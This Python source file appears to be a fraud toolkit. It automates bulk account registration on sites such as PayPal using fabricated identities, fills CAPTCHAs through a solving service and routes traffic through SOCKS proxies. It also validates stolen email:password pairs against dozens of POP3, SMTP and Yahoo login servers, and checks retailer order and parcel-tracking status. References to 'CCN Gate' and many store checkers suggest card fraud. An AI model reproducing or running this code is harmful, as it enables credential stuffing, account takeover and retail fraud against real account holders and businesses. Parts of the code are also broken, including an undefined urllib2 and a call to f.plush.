#!/usr/bin/python
# -*- coding: utf-8 -*-   
# -*- coding: latin-1 -*-
import webbrowser;
import re, random,os;
import sys, datetime, time;
import mechanize;
import socks;
import socket;
import smtplib
import poplib
import checkssh
from io import StringIO ## for Python 3
import bigfishgame, hotmail, amazon, ebay, belk, petmeds, michaelkors
# import kohls, checkzappos, bloomingdales, checklowes, checkbedbathandbeyond, checkchefcatalog, checkcostco, \
    # checkgap, checkhomedepot, checkoverstock, checkwalmart, checkwayfair, checkwilliamssonoma, checkjcpenney, \
    # checkbestbuy, samsclub, macys, paypal,bodybuilding,nordstrom,ebay,choxi,beallsflorida,neimanmarcus,quill,jet, checkssh, bigfishgame,bottraffic,zdo23,overstock,bluedolphin
# import shoprunner, hhgregg, moosejaw, abt, belk, mrporter,booksinc    
import mybrowser
from bs4 import BeautifulSoup, SoupStrainer;
from urllib.parse import urljoin, urlparse


class RegisterError(Exception): pass;


class FinalForm:
    """ Final form of registration
    """
    form = "form";
    html = "source code";
    captchaControlName = None;
    questionControlName = None;
    captchaImage = None;
    captchaResult = None;
    keyantigate = None;
    questionString = None;
    questionResult = None;
    referLink = None;
    sock = None;
    submitButton = '';

    def __init__(self, form, html):
        self.form = form;
        self.html = html;


class Emailcheck:
    """ Test reg forum
    """

    def __init__(self, emit='', qtcode='',
                 header="Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16",
                 appFolderPath='', updatestatus='finish'):
        self.header = header
        # add header
        self.emit = emit;
        self.qtcode = qtcode;
        self.appFolderPath = appFolderPath
        self.updatestatus = updatestatus

        self.browser = mybrowser.Mechanizebrowser()


    def add_header(self, host_check):
        if host_check.find('://') != -1:
            splited = host_check.split('://')[1];
            if splited.find('/') == -1:
                Host = splited
            else:
                Host = splited.split('/')[0]
        else:
            Host = host_check
        tt = [('User-Agent', self.header),
              ('Connection', ':keep-alive'),
              ('Accept-Language', ':en-US,en;q=0.8'),
              ('Host', Host),
              ('Cache-Control', 'max-age=0'),
              ('Referer', host_check),
              ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8')];
        # add header
        return tt

    def forceSetValue(self, form, value, control):
        """ force set value of control for form
        """
        try:
            form.set_value(value, control.name);
        except:  # fix the damn error with controll
            try:
                try:
                    form.controls.remove(control);
                except:
                    pass;
                form.new_control('text', control.name, {'value': value});
                form.fixup();
            except Exception as e:
                print(e);
                print(control);
                raise RegisterError("Unable to set value");

    def forceSetValueName(self, form, value, name):
        """ force set value for form with name
        """
        try:
            form.set_value(value, name);
        except:  # fix the damn error with controll
            try:
                try:
                    for control in form.controls[:]:
                        if control.name == name: form.controls.remove(control);
                except:
                    pass;
                form.new_control('text', name, {'value': value});
                form.fixup();
            except Exception as e:
                print(e);
                print(control);
                raise RegisterError("Unable to set value");

    def fixLink(self, link):
        par = urlparse(link);
        return 'http://' + par.netloc + par.path + '?' + par.query;

    def fixHTML(self, html):
        html = html.replace("'", '"')
        return html;

    def selectForm(self, html, linkget):
        try:
            forms_post = self.browser.forms()
        except:
            forms_post = []
        return forms_post

    def regAtLink(self, link, postParam=None, list_info='', sock=''):
        """ Automacticly register at link (not submit yet)
        Register Process:
        Step 1: navigate and find register form (posbile have to search and click some form to get there)

        Step 2: filling all information to register form + search For Capcha Image URL, Question String
            if there is Capcha, Question. Resolve it automaticly / force user to input answer. Then fill it to register form

        Step 3: Submit register form, check for success.
            if not success, find the error and display it to user then back to step 2 with current HTML data

        Step 4: check for email ....


        """
        print("Registering Account at", link)

        # step 1
        # find form and click agree
        browser = mechanize.Browser()
        browser.set_handle_robots(False)
        cookie = mechanize.LWPCookieJar()
        browser.set_cookiejar(cookie)
        tt = [('User-Agent', self.header),
              ('Connection', ':keep-alive'),
              ('Accept-Language', ':en-US,en;q=0.8'),
              ('Host', 'www.google.com'),
              ('Cache-Control', 'max-age=0'),
              ('Accept', 'text/html,application/xhtml+xml,arpplication/xml;q=0.9,/;q=0.8')];
        # add header
        browser.addheaders = tt;
        timeout = 60
        socket.setdefaulttimeout(timeout)
        tt = self.add_header(link)
        browser.addheaders = tt;
        if link.find('paypal.com') != -1:
            browser.open(link)
            link = 'https://www.paypal.com/vn/cgi-bin/webscr?cmd=_run-check-cookie-submit&redirectCmd=%5fregistration%2drun'
        request = urllib2.Request(link, postParam);
        pagePass = 0;
        while 1:
            i = 0
            while i < 5:
                try:
                    r = browser.open(request);
                    ##get form
                    html = r.read()
                    link_get = r.geturl()
                    html = self.fixHTML(html);
                    forms = self.selectForm(html, link_get)
                    tt = self.add_header(link_get)
                    browser.addheaders = tt;
                    r.close()
                ####form check
                except:
                    time.sleep(1)
                else:
                    break
            if i >= 5:
                print('socks die:' + sock)
                return 'socks die:' + sock

            pagePass += 1;
            print("Try page", pagePass)
            if self.regex['registerFormHTML'].search(html):
                print("Found register page")
                break;  #check if this is correct page for register
            if pagePass > 3:
                raise RegisterError("Reach maximum page, unable to find register page " + link);

            #raise "Why not identify this is correct form?";
            #fix form

            for form in forms:
                #if re.search(r'register|login/login|checkdate',form.action,re.IGNORECASE):break;
                if self.regex['navigateFormAction'].search(form.action): break;
            else:
                raise RegisterError("Navigate Form not found " + link);

            submitName = None;
            for control in form.controls[:]:
                if not control or not control.name: continue;
                if control.type == 'submit':
                    if self.regex['navigateSubmitName'].search(control.name) and not self.regex[
                        'negativeKeyword'].search(control.name):
                        submitName = control.name;
                        continue;
                elif control.type != 'hidden':
                    #fill in value
                    for pattern, value in self.navigateFormValue:
                        if re.search(pattern, control.name, re.IGNORECASE):
                            self.forceSetValue(form, value, control);
                            break;

            #raise "stop"
            print('submit')
            request = form.click(submitName);
        #break

        #raise "test1"

        #step 2
        #find form
        i = 0
        while i < 5:
            try:
                r = browser.open(request);
                ##get form
                html = r.read()
                link_get = r.geturl()
                html = self.fixHTML(html);
                forms = self.selectForm(html, link_get)
                tt = self.add_header(link_get)
                browser.addheaders = tt;
                r.close()
            ####form check
            except:
                time.sleep(1)
            else:
                break
        if i >= 5:
            print('socks die:' + sock)
            return 'socks die:' + sock
        for form in forms:
            if self.regex['registerFormAction'].search(form.action): break;
        else:
            raise RegisterError("Register Form not found " + link_get);

        #filling form

        regForm = self.find_captha(form, html, list_info, link_get)
        #print(regForm.submitButton
        if not regForm.captchaControlName:
            if regForm.submitButton:
                request = regForm.form.click(regForm.submitButton)
            else:
                request = regForm.form.click()
            i = 0
            while i < 5:
                try:
                    r = browser.open(request);
                    ##get form
                    html = r.read()
                    link_get = r.geturl()
                    html = self.fixHTML(html);
                    forms = self.selectForm(html, link_get)
                    tt = self.add_header(link_get)
                    browser.addheaders = tt;
                    r.close()
                ####form check
                except:
                    time.sleep(1)
                else:
                    break
            if i >= 5:
                print('socks die:' + sock)
                return 'socks die:' + sock

            for form in forms:
                if self.regex['registerFormAction'].search(form.action): break;
            else:
                raise RegisterError("Register Form not found " + link);
            #filling form
            print(form)
            regForm = self.find_captha(form, html, list_info, link_get)

        regForm.sock = sock;
        regForm.link = list_info;
        self.registerForm.append((list_info, regForm, browser));
        print(self.registerForm)
        print(list_info, "ready for submit")
        if regForm:
            regForm.referLink = link_get
            return list_info;

    def find_captha(self, form, html, list_info, link_get):
        regForm = FinalForm(form, html);
        submitFound = False;
        capchaFound = False;
        questionFound = False;
        for control in form.controls[:]:
            if not control or not control.name: continue;
            # input form ko phai name = hidden
            if not submitFound and self.regex['submitIDcontolName'].search(control.name):
                regForm.submitButton = control.name
            if self.regex['captchaInputControlName'].search(control.name):
                # save this control name for fill in captcha code
                print('==============' + control.name)
                regForm.captchaControlName = control.name;
                # captcha control (captcha ID)
            if not capchaFound and self.regex['captchaIDControlName'].search(control.name):
                print("Suppect capcha", control)
                imgCapchaID = control.value;
                pattern = None;
                captchaLink = link_get;
                captchaHtml = html;
                if not imgCapchaID.strip():  # find captcha without IDstring
                    #iframe captcha tweek
                    m = self.regex['iframeCaptchaLink'].search(html);
                    if m:
                        print("+iframe captcha detected")
                        captchaLink = self.fixLink(m.group(1));
                        response = self.browser.open(captchaLink);
                        captchaHtml = response.read();
                        captchaForm = self.browser.forms()[0];
                        for captchaControl in captchaForm.controls[:]:
                            if not captchaControl or not captchaControl.name: continue;
                            if captchaControl.type == 'hidden' and re.search('captcha', captchaControl.name,
                                                                             re.IGNORECASE):
                                #tweak the register form inserting
                                self.forceSetValue(form, captchaControl.value, control);
                                imgCapchaID = captchaControl.value;
                                #print("--tweek form! CaptchaID="+imgCapchaID;
                                break;
                        else:
                            raise RegisterError("Unable to handle iframe captcha " + captchaLink);
                    else:  #handle forum self captcha generator
                        #use some known keyword
                        pattern = self.regex['captchaImageFindPattern'].replace('%s',
                                                                                '(securimage|rndimg|secret\.jpeg)');

                        #find img link of capcha
                if not pattern:
                    pattern = self.regex['captchaImageFindPattern'].replace('%s', re.escape(imgCapchaID));

                m = re.findall(pattern, captchaHtml, re.DOTALL | re.IGNORECASE);
                if m:
                    list_catpcha = []
                    for img_capt in m:
                        typeimg = type(img_capt)
                        if str(typeimg).find('str') != -1:
                            img_captcha = img_capt
                        else:
                            img_captcha = img_capt[0]
                        captcha = urljoin(captchaLink, img_captcha).replace('&amp;', '&').replace('&#x3d;',
                                                                                                           '=').replace(
                            '&#x3f;', '?');
                        print("---Found captcha:", captcha)

                        # after get img, show img, lets user input, and find input capcha field to fill in
                        alphabet = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'
                        min = 5
                        max = 10
                        stringimg = ''
                        for x in random.sample(alphabet, random.randint(min, max)):
                            stringimg += x
                        captcha_save = 'captchaIMG' + stringimg + '.png'
                        f = open(self.appFolderPath + '/' + captcha_save, 'wb');
                        response = self.browser.open(captcha);
                        data = True;
                        while data:
                            data = response.read(1024);
                            f.write(data);
                        response.close();
                        f.close();
                        capchaFound = True;
                        print('save:' + captcha_save)
                        list_catpcha.append(captcha_save)
                    if len(list_catpcha) == 1:
                        regForm.captchaImage = list_catpcha[0];
                continue;

            # question control
            if not questionFound and control.type == 'text' and self.regex['questionInputControlName'].search(
                    control.name):
                print("Suppect question", control)
                #find part that contain question
                pattern = self.regex['questionPartFindPattern'].replace('%s', re.escape(control.name));
                m = re.search(pattern, html, re.DOTALL | re.IGNORECASE);
                if m:
                    question = re.sub(r' +', ' ', re.sub(r'<.+?>|&.+?;', '', re.sub(r'</p>|<br\s*/>', '\n', m.group(3)),
                                                         re.DOTALL)).strip();
                    print("---Found question:", question)
                    questionFound = True;
                    #save name of this control for fill in answer later
                    regForm.questionString = question;
                    regForm.questionControlName = control.name;
                continue;
            if control.type != 'hidden':
                #fill in value
                for pattern, value in self.registerFormValue:

                    if re.search(pattern, control.name, re.IGNORECASE):
                        self.forceSetValue(form, value, control);
                        break;
        # raise "test2";
        return regForm;

    def submitFinalForm(self, final, br):
        """ submit final form, (fill in captcha, answer)
        @return success or not (raise error if possible)
        """
        # add header for br
        # [('Host', 'youlink.sexyi.am'),
        # ('Origin', 'http://youlink.sexyi.am'),
        #		('Referer', 'http://youlink.sexyi.am/index.php?addmsg')]
        if final.sock:
            socksip = final.sock.split(':')[0]
            socksport = final.sock.split(':')[1]
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socksip, int(socksport))
            socket.socket = socks.socksocket
            r = self.browser.open("http://showip.com/")
            html = r.read()
            ips = re.search('Your IP address is <b><big><big>(.+?)</', html)
            if ips:
                print('Your Ip:' + ips.group(1).strip())
        tt = self.add_header(final.referLink)
        br.addheaders = tt;
        ##
        if final.keyantigate:
            biencaptcha = self.getcaptcha(final.keyantigate, self.appFolderPath + '\\' + final.captchaImage)
            os.remove(self.appFolderPath + '\\' + final.captchaImage)
            if biencaptcha:
                print('decaptcha:' + biencaptcha)
                final.captchaResult = str(biencaptcha);
        print("Trying submit form", final.link)
        # self.update_status("Trying submit form " + final.link)
        print(final.captchaResult)
        print('============submit')
        print(final.form)

        if final.captchaResult and final.captchaControlName:
            final.form[final.captchaControlName] = final.captchaResult
        if final.questionResult and final.questionControlName:
            self.forceSetValueName(final.form, final.questionResult, final.questionControlName);
        #print(final.form
        if final.submitButton:
            request = final.form.click(final.submitButton)
        else:
            request = final.form.click()
        c = open('dien.html', 'w')
        c.write(final.html)
        i = 0
        while i < 5:
            try:
                response = br.open(request);  #submit
                html = response.read();
                response.close()

            except:
                time.sleep(1)
            else:
                break
        if i >= 5:
            print('socks die:socks die')
            return False

        if self.regex['SuccessHTML'].search(html):
            print("Submit Success")
            return True;
        else:
            print("Submit Failed")
            m = self.regex['errorHTML'].search(html);
            error = '';
            if m:
                print("Check these errors:")
                error = re.sub(r' +', ' ', re.sub(r'<.+?>|&.+?;', '', re.sub(r'</p>|<br\s*/>', '\n', m.group(0)),
                                                  re.DOTALL)).strip();
                print(error)
            #raise RegisterError("Submit final form failed! "+final.form.action);
            return False;
        br.close()
        del br
        del final

    ## checker
    def send_message(self, message, to_user=None):
        """Send message to user
        @param message
        @param to_user user nick name, default is self.nicknamerequest
        @return
        """
        if not to_user:
            to_user = 'ruandejun';
        try:
            f = open('temp_data_chat2.txt', 'a')
            f.write('\n' + to_user + '|:|[+]' + message);
            f.plush()
            f.close()
        except:
            pass
        return



    def check_tracking_status(self, trackingnumber, sock, sock_type):

        print('Checking ' + trackingnumber)
        if sock:
            socksip = sock.split(':')[0]
            socksport = sock.split(':')[1]
            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socksip, int(socksport))
            socket.socket = socks.socksocket
        i = 0
        while i < 4:
            try:
                r = self.browser.open('https://iship.com/trackit/track.aspx')
                html = r.read()
                linkget = r.geturl()
                allform = self.browser.selectForm(html,linkget)
                checkform = None
                for form in allform:
                    if str(form).find('TextControl(Track') != -1:
                        checkform = form
                        break
                if not checkform:
                    print('check tracnking error')
                    return
                checkform['Track'] = trackingnumber
                request = checkform.click('TSubmit')
                r = self.browser.open(request)
                html = r.read()
            except:
                time.sleep(1)
            else:
                break
            i += 1
        if i >= 4:
            print('socks die')
            return 'check die:socks die:'

        trackingstatus = None
        if re.search('RETURN TO', html, re.IGNORECASE) or re.search('RETURNED TO', html, re.IGNORECASE) or re.search('RETURNING',html,re.IGNORECASE):
            trackingstatus = 'Return'
        else:
            statusre = re.search('Status:</td><td style="font-family:trebuchet ms,arial,sans-serif;width:480px;">(.+?)</', html)
            if statusre:
                trackingstatus = statusre.group(1).strip()
                try:
                    trackingstatus = re.sub(r' +', ' ', re.sub(r'<.+?>|&.+?;', '',
                                                               re.sub(r'</p>|<br\s*/>', '\n', trackingstatus,
                                                                      re.DOTALL))).decode('utf-8', 'ignore')
                except:
                    trackingstatus = re.sub(r' +', ' ', re.sub(r'<.+?>|&.+?;', '',
                                                               re.sub(r'</p>|<br\s*/>', '\n', trackingstatus,
                                                                      re.DOTALL))).encode('utf-8',
                                                                                          'ignore')  # html to text
        print(trackingstatus)
        return trackingstatus

    def check_bloomingdales_status(self, ordernumber, billemail, sock, sock_type):

        request_url = 'https://www.bloomingdales.com/service/order-details'
        r = self.browser.open(request_url)
        ##get form
        html = r.read()
        link_get = r.geturl()
        html = self.fixHTML(html);
        forms = self.selectForm(html, link_get)
        tt = self.add_header(link_get)
        self.browser.addheaders = tt;
        r.close()
        ####form check
        checkout_form = None
        for form in forms:
            print(form)
            if str(form).find('TextControl(OrderNumber') != -1:
                checkout_form = form
                break
        checkout_form['OrderNumber'] = ordernumber
        checkout_form['emailID'] = billemail
        request = checkout_form.click()
        r = self.browser.open(request)
        html = r.read()
        c = open('dien.html', 'w')
        c.write(html)

        order_status = ''
        tracking = ''
        if html.find('div class="progressBarNormal canceled') != -1:
            print('canceled')
            order_status = order_status + 'canceled\n'
            tracking = 'Canceled'
        elif html.find('<div class="progressBar">') != -1:
            order_status = order_status + 'processing\n'
            print('processing')
            trackingre = re.search('<li class="trackID">tracking \#:\s*<span>(.+?)</span>', html)
            if trackingre:
                tracking = trackingre.group(1).strip()
            else:
                if html.find('type="button" id="cancelOrderButton') == -1:
                    tracking = 'Shipped'
                else:
                    tracking = 'processing'
            print(tracking)
        order_status = order_status + 'Shipping Address\n'
        order_status = order_status + 'All Item\n'
        order_status = order_status + tracking + '\n'
        return order_status

    def check_email_valid(self, email, username, password, sock, sock_type):
        checkpop = ''
        if re.search('@hotmail\.|@live\.', email, re.IGNORECASE):
            HOST1 = 'pop3.live.com'
            PORT1 = 995
            checkpop = True
        elif re.search('@msn\.', email, re.IGNORECASE):
            HOST1 = 'pop3.email.msn.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@gmail\.', email, re.IGNORECASE):
            HOST1 = 'pop.gmail.com'
            PORT1 = 995
            checkpop = True
        elif re.search('@aol\.', email, re.IGNORECASE):
            HOST1 = 'smtp.aol.com'
            PORT1 = 587
        elif re.search('@netscape\.', email, re.IGNORECASE):
            HOST1 = 'pop.3.isp.netscape.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@comcast\.', email, re.IGNORECASE):
            HOST1 = 'smtp.compcast.net'
            PORT1 = 587
        elif re.search('@1and1\.', email, re.IGNORECASE):
            HOST1 = 'pop.1and1.com'
            PORT1 = 995
            checkpop = True
        elif re.search('@cs\.com', email, re.IGNORECASE):
            HOST1 = 'smtp.cs.com'
            PORT1 = 587
        elif re.search('@earthlink\.', email, re.IGNORECASE):
            HOST1 = 'pop.earthlink.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@mindspring\.', email, re.IGNORECASE):
            HOST1 = 'pop.mindspring.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@onemain\.', email, re.IGNORECASE):
            HOST1 = 'pop.onemain.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@optonline\.', email, re.IGNORECASE):
            HOST1 = 'mail.optonline.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@optimum\.', email, re.IGNORECASE):
            HOST1 = 'mail.optimum.net'
            PORT1 = 110
            checkpop = True

        elif re.search('@netzero\.', email, re.IGNORECASE):
            HOST1 = 'pop.netzero.net'
            PORT1 = 110
            checkpop = True
        elif re.search(
                '@att\.|@ameritech\.|@bellsouth\.|@flash\.|@nvbell\.|@pacbell\.|@prodigy\.|@sbcglobal\.|@snet\.|@swbell\.|@wans\.',
                email, re.IGNORECASE):
            HOST1 = 'inbound.att.net'
            PORT1 = 995
            checkpop = True
        elif re.search('@verizon\.', email, re.IGNORECASE):
            HOST1 = 'incoming.verizon.net'
            PORT1 = 995
            checkpop = True
        elif re.search('@hughes\.', email, re.IGNORECASE):
            HOST1 = 'mail.hughes.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@metrocast\.', email, re.IGNORECASE):
            HOST1 = 'pop.va.metrocast.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@bellatlantic\.', email, re.IGNORECASE):
            HOST1 = 'pop.bellatlantic.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@mybluelight\.', email, re.IGNORECASE):
            HOST1 = 'pop.mybluelight.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@blueyonder\.', email, re.IGNORECASE):
            HOST1 = 'pop.blueyonder.co.uk'
            PORT1 = 110
            checkpop = True
        elif re.search('@gobrainstorm\.', email, re.IGNORECASE):
            HOST1 = 'mail.gobrainstorm.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@btclick\.', email, re.IGNORECASE):
            HOST1 = 'pop3.btclick.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@btconnect\.', email, re.IGNORECASE):
            HOST1 = 'pop3.btconnect.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@btinternet\.|@btopenworld\.', email, re.IGNORECASE):
            HOST1 = 'mail.btinternet.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@charter\.', email, re.IGNORECASE):
            HOST1 = 'pop.charter.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@clara\.', email, re.IGNORECASE):
            HOST1 = 'pop.clara.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@compuserve\.', email, re.IGNORECASE):
            HOST1 = 'pop.compuserve.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@compaq\.', email, re.IGNORECASE):
            HOST1 = 'pop3.compaq.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@concentric\.', email, re.IGNORECASE):
            HOST1 = 'pop3.concentric.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@cox\.', email, re.IGNORECASE):
            HOST1 = 'pop.cox.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@demon\.', email, re.IGNORECASE):
            HOST1 = 'pop3.demon.co.uk'
            PORT1 = 110
            checkpop = True
        elif re.search('@directnic\.', email, re.IGNORECASE):
            HOST1 = 'pop.directnic.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@registerapi\.', email, re.IGNORECASE):
            HOST1 = 'pop.registerapi.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@eclipse\.', email, re.IGNORECASE):
            HOST1 = 'mail.eclipse.co.uk'
            PORT1 = 110
            checkpop = True
        elif re.search('@f2s\.', email, re.IGNORECASE):
            HOST1 = 'inmail.f2s.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@free-online\.', email, re.IGNORECASE):
            HOST1 = 'mail.free-online.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@adelphia\.', email, re.IGNORECASE):
            HOST1 = 'mail.adelphia.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@sky\.', email, re.IGNORECASE):
            HOST1 = 'pop.tools.sky.com'
            PORT1 = 995
            checkpop = True
        elif re.search('@rr\.', email, re.IGNORECASE):
            HOST1 = 'pop-server.rr.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@fish\.', email, re.IGNORECASE):
            HOST1 = 'pop.fish.co.uk'
            PORT1 = 110
            checkpop = True
        elif re.search('@attbi\.', email, re.IGNORECASE):
            HOST1 = 'mail.attbi.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@frontier\.', email, re.IGNORECASE):
            HOST1 = 'pop3.frontier.com'
            PORT1 = 995
            checkpop = True
        elif re.search('@rcn\.', email, re.IGNORECASE):
            HOST1 = 'pop.rcn.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@suddenlink\.', email, re.IGNORECASE):
            HOST1 = 'pop.suddenlink.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@sympatico\.', email, re.IGNORECASE):
            HOST1 = 'pop1.sympatico.ca'
            PORT1 = 110
            checkpop = True
        elif re.search('@talktalk\.', email, re.IGNORECASE):
            HOST1 = 'mail.talktalk.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@tiscali\.', email, re.IGNORECASE):
            HOST1 = 'pop.tiscali.co.uk'
            PORT1 = 110
            checkpop = True
        elif re.search('@windstream\.', email, re.IGNORECASE):
            HOST1 = 'pop.windstream.net'
            PORT1 = 110
            checkpop = True
        elif re.search('@virginmedia\.', email, re.IGNORECASE):
            HOST1 = 'pop3.virginmedia.com'
            PORT1 = 110
            checkpop = True
        elif re.search('@yahoo\.', email, re.IGNORECASE):
            r = self.browser.open('http://mlogin.yahoo.com/')
            for form in self.browser.forms():
                if str(form).find('PasswordControl(password') != -1:
                    break
            form['id'] = email
            form['password'] = password
            request = form.click()
            r = self.browser.open(request)
            result = r.read()
            if result.find('name="password"') == -1:
                print('===Valid===')
                return email + '|' + password
            else:
                print('===Invalid===')
                return;
        else:
            return email + '|' + password + '|dont support';
        print('Host:' + HOST1 + ':' + str(PORT1))
        if checkpop:
            try:
                pop = poplib.POP3_SSL(HOST1, PORT1)
                pop.user(email)
                pop.pass_(password)
                pop.quit()
                return email + '|' + password
            except:
                print('===Invalid===')
                return;
        else:
            try:
                smtpserver = smtplib.SMTP(HOST1, PORT1)
                smtpserver.ehlo()
                smtpserver.starttls()
                smtpserver.ehlo
                smtpserver.login(email, password)
                return email + '|' + password
            except:
                print('===Invalid===')
                return;

    def creat_register_info(self):
        #####################################for register
        alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        min = 8
        max = 12
        stringimg = ''
        for x in random.sample(alphabet, random.randint(min, max)):
            stringimg += x
        username_chuan = stringimg
        email_chuan = username_chuan + '@hotmail.com'
        self.username = username_chuan
        self.email = email_chuan
        print('Trying Creat Account:' + self.email + '|Hanoi123')
        birth_day = str(random.randint(1, 30))
        if len(birth_day) == 1:
            birth_day = '0' + birth_day
        birth_moth = str(random.randint(1, 12))
        if len(birth_moth) == 1:
            birth_moth = '0' + birth_moth
        birth_year = str(random.randint(1960, 1990))
        firstname_open = open('vnfirstname.db', 'r')
        lastname_open = open('vnlastname.db', 'r')
        stress_open = open('vnstress.db', 'r')
        cityzip_open = open('vncityzip.db', 'r')
        list_firstname = firstname_open.read().split('\n')
        list_lastname = lastname_open.read().split('\n')
        list_stress = stress_open.read().split('\n')
        list_cityzip = cityzip_open.read().split('\n')

        first_name = list_firstname[random.randint(0, len(list_firstname) - 1)].strip()
        last_name = list_lastname[random.randint(0, len(list_lastname) - 1)].strip()
        stress_name = list_stress[random.randint(0, len(list_stress) - 1)].strip()
        cityzip_name = list_cityzip[random.randint(0, len(list_cityzip) - 1)].strip()
        list_cityzip_split = cityzip_name.split('|')
        city = list_cityzip_split[0].strip()
        state = city
        zip = list_cityzip_split[1].strip()
        address1 = str(random.randint(100, 9999)) + ' ' + stress_name
        address2 = ''
        H_PhoneNumber = str(random.randint(100000000, 9999999999))
        # data setup
        list_infomation = first_name + '|' + last_name + '|' + address1 + '|' + address2 + '|' + city + '|' + state + '|' + zip + '|' + H_PhoneNumber + '|' + email_chuan + '|Hanoi123|' + self.myip
        print(list_infomation)
        # pattern + value
        self.navigateFormValue = [
            ('month|day|register|agree', '1'),
            ('year', '1991'),
        ]
        self.registerFormValue = [
            ('referrer', ''),
            ('username|user_name', self.username),
            ('first_name', first_name),
            ('last_name', last_name),
            ('address1', address1),
            ('address2', address2),
            ('city', city),
            ('state', state),
            ('zip', zip),
            ('H_PhoneNumber', H_PhoneNumber),
            ('birthdate_a', birth_moth),
            ('birthdate_b', birth_day),
            ('birthdate_c', birth_year),
            ('email', self.email),
            ('password|passwrd', 'Hanoi123'),
        ]
        self.regex = {
            'registerFormHTML': re.compile(r'form.*?(user|name).*?(password|passwrd).*?(confirm|re-enter).*?email'
                                           r'|form.*?(user|name).*?email.*?(confirm|re-enter).*?(password|passwrd)'
                                           , re.I | re.DOTALL),
            'SuccessHTML': re.compile('Congratulations', re.IGNORECASE),
            'submitIDcontolName': re.compile(r'next\.x|gif_continue\.x', re.IGNORECASE),
            'navigateFormAction': re.compile(r'register|login/login|checkdate|paypal\.com', re.IGNORECASE),
            'navigateSubmitName': re.compile('agree|accept|account_type_personal', re.IGNORECASE),
            'negativeKeyword': re.compile('not|dont|coppa', re.IGNORECASE),
            'registerFormAction': re.compile(r'register|addmember|forms|paypal\.com', re.IGNORECASE),
            'captchaIDControlName': re.compile(
                'securityCode|confirm_id|recaptcha_challenge|humanverify\[hash\]|txtAnswer|txtSecurity', re.IGNORECASE),
            'iframeCaptchaLink': re.compile(r'<iframe\s*src="([^"]*?recaptcha[^"]*?)"[^<>]*?>\s*</iframe>',
                                            re.IGNORECASE),
            #group 1
            'captchaInputControlName': re.compile(
                'confirm_code|securityCode|recaptcha_response|humanverify\[input\]|txtAnswer|txtSecurity',
                re.IGNORECASE),
            'captchaImageFindPattern': r'<img[^<>]*?src="([^"]*?%s[^"]*?)"[^<>]*?>',  # %s=captchaID , group 1
            'questionInputControlName': re.compile('human|verify|kiril|register_vv|qa_answer|field', re.IGNORECASE),
            'questionPartFindPattern': r'<(fieldset|div|tr)[^<>]*?>.*?(anti|spam|question|robots|verification|qanda|verify).{0,100}?>(.{0,400}?<input[^<>]*?name="%s"[^<>]*?>.*?)</(fieldset|div|tr)>',
            # %s=question input name, group 3
            'errorHTML': re.compile('<[^<>]*?"[^"]*?error[^"]*?"[^<>]*?>(.+?)</[^<>]*?>', re.IGNORECASE | re.DOTALL),
        }
        return list_infomation

    def check_email(self, list_email_check, registerForm='', check_site='', sock='', sock_type='', list_bill=None, extraoption='', checkAmazon=False, checkEbay=False):


        timeout = 120
        socket.setdefaulttimeout(timeout)

        if check_site.find('Ebay') != -1:
            self.add_header('www.ebay.com')
        self.registerForm = registerForm  # this dict hold the final form of a registration (only need to fillin captcha and answer)
        ##email + password
        if check_site.find('Tracking Status') != -1:
            if 11 < len(list_email_check.strip()) <= 22 or list_email_check.strip()[
                                                           :2] == '1Z' or list_email_check.strip()[
                                                                          :3] == '940' or list_email_check.strip()[
                                                                                          :2] == 'C1':
                checktrack = None
                if list_email_check.strip()[:2] == '1Z' or list_email_check.strip()[:2] == 'C1':
                    checktrack = list_email_check.strip()
                elif (11 < len(list_email_check.strip()) <= 22 or list_email_check.strip()[
                                                                  :3] == '940') and list_email_check.isdigit():
                    checktrack = list_email_check.strip()
                if checktrack:
                    status_check = self.check_tracking_status(checktrack, sock, sock_type)
                    if status_check:
                        if status_check.find('socks die:') != -1:
                            print('socks die:' + list_email_check)
                            return 'socks die:' + list_email_check
                        elif status_check.find('dont support') != -1:
                            return status_check + '|dont support'
                        elif check_site.find('Email') != -1 or check_site.find('CCN Gate') != -1:
                            return list_email_check + '|' + status_check + '\n'
                        else:
                            return list_email_check + '|' + status_check + '\n'
                    else:
                        return 'check die: not valid'
        elif check_site.find('Bot traffic') != -1:
            print('bot traffic')
            check_process = bottraffic.Bottraffic()
